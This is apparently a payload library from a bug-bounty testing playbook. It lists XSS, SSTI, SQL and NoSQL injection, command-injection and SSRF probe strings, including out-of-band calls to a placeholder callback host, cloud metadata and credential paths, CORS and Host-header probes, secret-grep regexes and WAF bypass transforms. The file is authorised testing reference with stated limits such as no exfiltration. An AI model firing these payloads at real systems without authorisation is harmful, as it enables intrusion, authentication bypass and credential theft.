# Payload Library: validated probe strings, param lists, marker batteries, bypass transforms

One reference of the exact strings the playbook's classes fire. Every list here is battle-tested shape, not theory: param names come from real API surfaces, probes from real detections, bypasses from real WAF walls. Pair each payload with its control (the same request minus the payload) per knowledge/verification.md; a payload without a differential is noise. RCE-capable probes (SSTI engine escapes, command separators) run only through the harmless-command ladder: output captured, marker written and read back, cleanup.

## 1. Open redirect and OAuth relay param names

Probe each with `=https://<OOB-HOST>/BB<MARKER>` (callback host you control) and capture the Location header:

```
url uri redirect redirect_uri redirect_url redirectUrl return returnUrl returnTo return_to
next rurl r_uri u link links goto go dest destination destinationUrl target targetUrl
view continue cont callback callbackUrl callback_uri successUrl success_url
forward forwards out outUrl exiturl exit_url jump jurl nav navigate navigationUrl
data (base64-wrapped redirects) href ref referer source relay stateless gotoUrl
```

OAuth-relay-specific: `redirect_uri`, `callback`, `continue`, `post_logout_redirect_uri`, `target_link_uri` (OIDC), ` RelayState ` (SAML). The relay chain completes only when the Location lands on (or transits) your host; the redirect alone is chain fodder (cheatsheets/jwt-oauth.md section 6).

## 2. IDOR / BOLA object-reference param names

Range-probe each with 1, 100, 1000, 99999999 (cheatsheets/http.md section 5) plus the A/B differential:

```
id uid user_id userId user user_uuid uuid guid account accountId account_id
profile profileId member memberId customer customerId ref reference refId
order orderId order_id invoice invoiceId invoice_no doc docId document documentId
transaction trx trxId trx_id payment paymentId txn txnId
booking bookingId reservation reservationId ticket ticketNo ticket_id
item itemId item_id product productId sku cart cartId basketId
message messageId msgId comment commentId post postId thread threadId
report reportId file fileId attachmentId media mediaId image imageId
pid cid sid tid nid qid aid vid kid lid rid gid xid no num number kode code
patientId employeeId staffId teacherId studentId vehicleId assetId deviceId
```

Header forms: `X-User-Id`, `X-User`, `X-Account-Id`, `X-Impersonate`, `X-Admin`, `X-Forwarded-User`, `X-Original-User-Id`, plus body-field forms inside JSON/GraphQL variables (`"userId"`, `node(id: ...)`, GID `gid://<Type>/<n>`).

## 3. Auth-gate UA fingerprint values (the client-fingerprint ladder)

```
okhttp/3.14.9    okhttp/4.9.3    (app UA constants, public in every APK)
Dalvik/2.1.0 (Linux; U; Android 12; <device>)    (older stacks)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36
curl/8.4.0    python-requests/2.31.0    axios/1.6.0    ReactNative
```

Match header sets to the UA (okhttp sends `Accept-Encoding: gzip`, `Connection: Keep-Alive`); a fingerprint-gated surface 401s everything except the app's exact set (cheatsheets/http.md section 1, rung 3).

## 4. XSS context probes (canary function = your marker)

Name the canary after the random marker so the console artifact proves YOUR payload executed:

```bash
python3 -c "import secrets; print('bbq' + secrets.token_hex(3))"     # e.g. bbq9f2a1c
```

```
element context:      <bbq>marker</bbq>                       (custom tag = no sanitizer proof)
                       <img src=x onerror=bbq(1)>
                       <svg onload=bbq(1)>
attribute context:    " onfocus=bbq(1) autofocus=
                       ' onmouseover=bbq(1) x='
JS string context:    '-bbq(1)-'
                       ";bbq(1);//
template attr:        {{constructor.constructor('bbq(1)')()}}   (Angular sandbox escape, versioned)
URL/href context:     javascript:bbq(1)
                       data:text/html;base64,<b64 of a bbq() caller>
DOM sinks:            #<img src=x onerror=bbq(1)>             (location.hash sources)
                       ?default=<img src=x onerror=bbq(1)>     (open redirect -> DOM XSS relay)
postMessage:          victim window opener: e.source.postMessage({type:'bbq'}, '*')
                       attacker page: window.opener.postMessage({...}, '*')
```

Verification bar: browser-executed proof only (console artifact or screenshot of the executed canary); a reflected string is nothing (playbook class 10).

## 5. SSTI engine identification probes

```
{{7*7}} ${7*7} <%= 7*7 %> #{7*7} {7*7} {{7*'7'}} [[${7*7}]] <c:out value="${7*7}"/>
```

| Engine | Identification probe | Confirmed by |
|---|---|---|
| Jinja2 | `{{7*'7'}}` | 7777777 (string multiplication) |
| Twig | `{{7*7}}` + `{{_self.env.display("X")}}` | 49; env display errors on modern, legacy proves version |
| FreeMarker | `${7*7}` + `<#assign x=7*7>${x}` | 49 |
| Velocity | `#set($x=7*7)${x}` | 49 |
| Smarty | `{math equation="7*7"}` | 49 |
| Mako | `${7*7}` | 49 |
| ERB (Ruby) | `<%= 7*7 %>` | 49 |
| Spring EL | `${7*7}` (Thymeleaf: `[[${7*7}]]`) | 49 |
| Pebble | `{% set x = 7*7 %}{{x}}` | 49 |

Engine confirmed -> the class-13 workflow continues; RCE through template escapes runs the harmless-command ladder only (id output, marker round-trip, cleanup). NEVER fire payload strings that exfiltrate or persist.

## 6. Command injection separators and time probes

Separators (URL-encoded where the param rides a URL):

```
;   %3B    |   %7C    ||   %7C%7C    &&   %26%26    newline %0A   CR %0D    `%60`
$( )  %24%28 %29    backtick-wrapped   `x`    < redirect   > redirect
```

Time probes per platform (differential vs control, 3x medians):

```
Linux:    sleep 5                      ping -c 5 127.0.0.1
Windows:  ping -n 5 127.0.0.1          timeout 5   (no stdout, time-only)
Blind:    curl http://<OOB-HOST>/BB<MARKER>   (dispatch proof via the callback host)
```

The OOB callback landing is the first proof; the marker round-trip on the same injection point closes the claim (verification.md RCE ladder).

## 7. SQLi detection primitives per DB family

```
MySQL     : ' AND SLEEP(5)-- -          ' AND BENCHMARK(5000000,MD5(1))-- -
            ' AND EXTRACTVALUE(1,CONCAT(0x2e,VERSION()))-- -
            ' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
PostgreSQL: ' AND pg_sleep(5)-- -       ' || (SELECT version())::text || '
            ' AND 1=(SELECT 1/pg_sleep(5))--
MSSQL     : '; WAITFOR DELAY '0:0:5'--  (stacked; requires ; enabled)
            ' AND 1=CONVERT(int,(SELECT @@version))--
OOB (MSSQL): ; EXEC master..xp_dirtree '\\<OOB-HOST>\BB'--   (DNS/SMB dispatch proof)
OOB (Oracle): ' AND UTL_INADDR.GET_HOST_ADDRESS('BB.<OOB-HOST>')--   ' AND UTL_HTTP.REQUEST('http://<OOB-HOST>/BB')--
SQLite    : ' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))--  (CPU-time oracle)
Boolean   : ' AND 1=1-- -   vs   ' AND 1=2-- -     (size/status/body differential)
```

Every probe fires with its control in the same evidence block; medians for time claims; one masked sample + COUNT for data proofs (cheatsheets/injection.md discipline).

## 8. NoSQL operator payloads

JSON body forms:

```json
{"email": {"$ne": ""}, "password": {"$ne": ""}}
{"email": {"$regex": "^a"}, "password": {"$gt": ""}}
{"username": {"$nin": ["admin", "root"]}, "password": {"$ne": "x"}}
{"search": {"$regex": ".*", "$options": "i"}}
{"$where": "sleep(2000) || 'x'=='x'"}
{"field": {"$type": "string"}}
{"age": {"$gt": 0, "$lt": 200}}
```

Query-string forms (Express/PHP legacy parsing):

```
?username[$ne]=admin&password[$ne]=x
?username[$regex]=^adm
?price[$gte]=0&price[$lte]=99999
```

`$ne` empty on login = auth bypass (class 3 crossover); `$regex` char-by-char = extraction oracle; `$where` sleep = time proof.

## 9. SSRF metadata ladder (per cloud, harmless fields only)

```
AWS IMDSv1 : http://169.254.169.254/latest/meta-data/instance-id
             http://169.254.169.254/latest/meta-data/iam/security-credentials/   (role NAME only - the listing; credential values stay unread)
AWS IMDSv2 : PUT http://169.254.169.254/latest/api/token   header: X-aws-ec2-metadata-token-ttl-seconds: 60
             then GET with X-aws-ec2-metadata-token: <token>
             (fetchers that cannot PUT or set headers = IMDSv2 is a real boundary, note it)
GCP        : http://metadata.google.internal/computeMetadata/v1/instance/name   header: Metadata-Flavor: Google
             http://metadata.google.internal/computeMetadata/v1/   (no header = blocked, with header = open)
Azure      : http://169.254.169.254/metadata/instance?api-version=2021-02-10   header: Metadata: true
             http://168.63.129.16/   (wireserver)
Alibaba    : http://100.100.100.200/latest/meta-data/instance-id
DigitalOcean: http://169.254.169.254/metadata/v1/id
Oracle     : http://192.0.0.192/opc/v2/instance/   header: Authorization: Bearer Oracle
K8s (file) : file:///var/run/secrets/kubernetes.io/serviceaccount/namespace   (fetchers allowing file:)
Local      : file:///etc/hostname   file:///proc/self/environ
Internal map: http://<internal-host>:<port>/ differential sweep (open/closed/refused)
```

Read ONE harmless field (instance-id, hostname, timestamp) as the proof; credential paths documented, never executed (playbook class 7 proof bar).

## 10. CORS origin probes

```
Origin: https://evil.example                 (basic reflection)
Origin: null                                (sandboxed iframe caller)
Origin: https://<TARGET>                     (same-origin misconfig)
Origin: https://sub.<TARGET>                 (subdomain wildcard)
Origin: https://<TARGET>.evil.example        (suffix confusion)
Origin: https://evil-<TARGET>.com            (prefix confusion)
Origin: https://<TARGET>.com.evil.example
Origin: HTTPS://<TARGET>                     (case parse confusion)
Origin: https://<TARGET>%2eevil.example      (percent-escape confusion)
```

The finding needs reflected Origin + `Access-Control-Allow-Credentials: true` together with credentialed access demonstrated (fetch with credentials from a controlled page).

## 11. Host / forwarded header probes

```
Host: attacker.example
X-Forwarded-Host: attacker.example
X-Original-Host: attacker.example
X-Host: attacker.example
X-Forwarded-Server: attacker.example
X-HTTP-Host-Override: attacker.example
X-Rewrite-URL: /attacker-path
X-Forwarded-Proto: https          (scheme confusion on redirect/cache keys)
X-Forwarded-Port: 8443
Forwarded: host=attacker.example;proto=https      (RFC 7239 form)
X-Forwarded-For: 127.0.0.1        (internal-trust confusion; also rate-limit dimension rotation)
```

Password-reset links + Host/X-Forwarded-Host = the reset-poisoning chain (cheatsheets/http.md section 8); cache keys + unkeyed headers = poisoning.

## 12. Mass-assignment field battery

```
role isAdmin is_admin isAdmin is_superuser superuser is_staff staff admin
is_paid isPaid paid approved verified active enabled suspended banned
tier tierId level permission permissions scopes scope group groupId group_ids
tenantId tenant organizationId organization_role orgRole
balance credit credits amount price discount fee commission
status state transition workflowStep step
email (change without verification)   phone   password (direct set)
userType accountType account_type membershipType
```

Fire each as `{"<field>": true}` (or the natural type), read back the object, and check which stuck AND elevated. Silent-discard vs accept-and-ignore distinguishes frameworks (cheatsheets/race-logic.md section 7).

## 13. Secret marker grep battery (ready-to-run)

One pass over any string corpus (APK dumps, JS, asar, .env, configs):

```bash
grep -nE 'AIza[0-9A-Za-z_-]{35}|AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|GOOG[A-Za-z0-9_-]{30,}' <CORPUS>
grep -nE 'eyJ[A-Za-z0-9_-]{15,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{5,}' <CORPUS>
grep -nE 'BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY' <CORPUS>
grep -nE 'Authorization: (Basic|Bearer) [A-Za-z0-9+._-]{16,}' <CORPUS>
grep -niE 'client[_-]?secret["'"'"' :=]+[A-Za-z0-9+/_-]{12,}' <CORPUS>
grep -nE 'sk_live_[A-Za-z0-9]{16,}|pk_live_[A-Za-z0-9]{16,}|rh_live_|whsec_[A-Za-z0-9]{16,}|rk_live_' <CORPUS>
grep -nE 'ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{20,}' <CORPUS>
grep -nE 'xox[baprs]-[A-Za-z0-9-]{10,}' <CORPUS>
grep -nE 'npm_[A-Za-z0-9]{36}|pypi-AgEIcHlwaS5vcmc[A-Za-z0-9_-]{20,}|ATATTx[A-Za-z0-9_-]{40,}' <CORPUS>
grep -niE '(api[_-]?key|apikey|secret[_-]?key|access[_-]?key|signing[_-]?key|auth[_-]?token)["'"'"' :=]+[A-Za-z0-9+/_-]{16,}' <CORPUS>
grep -niE 'fcm\.googleapis\.com|onesignal\.com|airship\.|braze|firebaseadmin|adminsdk' <CORPUS>
grep -nE '[-A-Za-z0-9]{36}\.apps\.googleusercontent\.com' <CORPUS>
grep -niE 'password["'"'"' :=]+[A-Za-z0-9!@#$%^&*()_+-]{8,}' <CORPUS>
```

Every hit is a LEAD until its ladder runs (cheatsheets/secrets-recovery.md sections 4-6); "valid key" appears nowhere.

## 14. Mobile manifest triage battery

```bash
M=decoded/apktool/AndroidManifest.xml
grep -oE 'android:(allowBackup|usesCleartextTraffic|debuggable|testOnly)="[a-z]+"' $M
/usr/bin/grep -n 'android:exported="true"' $M | head -20
grep -oE 'android:host="[^"]+"' $M | sort -u                      # autoVerify hosts -> assetlinks battery
grep -oE 'android:scheme="[^"]+"' $M | sort -u                    # custom schemes -> deeplink battery
grep -oE 'android:permission="[^"]+"' $M | sort -u | head
grep -c 'provider\|receiver\|service' $M
# assetlinks check per autoVerify host (broken/default JSON is reportable via the HTTP response):
for h in $(grep -oE 'android:host="[^"]+"' $M | cut -d'"' -f2 | grep -v '^$' | sort -u); do
  printf '%s -> ' "$h"; curl -s -o /dev/null -w '%{http_code} %{size_download}\n' "https://$h/.well-known/assetlinks.json"
done
```

## 15. WAF bypass transforms (the ladder, in order)

```
case mixing        : SLEEP -> sLeEp
comment splitting  : SLEEP(5) -> SLE/**/EP(5)   SELECT -> /*!50000SELECT*/
whitespace swaps   : %20 -> %09 (tab) %0b %0c  ; newline %0a between tokens
double-encoding    : %27 -> %2527   (only where the stack double-decodes)
unicode escapes    : ' -> \u0027 (JS-context payloads), \u{27}
content-type swap  : form <-> JSON <-> XML on the same endpoint (parser confusion)
verb change        : GET -> POST (body-carrying rules differ)
path normalization : /api/v1/x -> /api/v1/./x -> /api/v1/../api/v1/x -> /API/V1/X
chunked transfer   : Transfer-Encoding: chunked splits signature windows
```

Blocked-by-WAF is not fixed: run the ladder, record which rung fired and which were blocked, honestly (the finding boundary, not a defeat).

## 16. Race burst settings (from the measured engagements)

```
start: 20 concurrent, barrier-release, your own accounts
scale: 50 -> 100 only when 20 shows the differential and the target tolerates it
sync  : barrier (default) | last-byte sync (server serializes on connect)
cap   : 3 bursts per surface per session; state read between bursts
verify: final-state read with a FRESH session (response counts lie, state does not)
```

## 17. Artifact and marker naming

```bash
python3 -c "import secrets; print('BB_' + secrets.token_hex(6))"    # artifact/marker prefix + random
python3 -c "import secrets; print('bbq' + secrets.token_hex(3))"    # XSS canary function name
python3 -c "import secrets; print('probe-' + secrets.token_hex(4))" # OOB subdomain marker
```

Every write-test artifact, every placed marker, every canary carries the engagement's random marker: read-back proves it is YOURS, cleanup finds it by name, and nothing of the operator's identity ever rides in it (knowledge/identity.md).
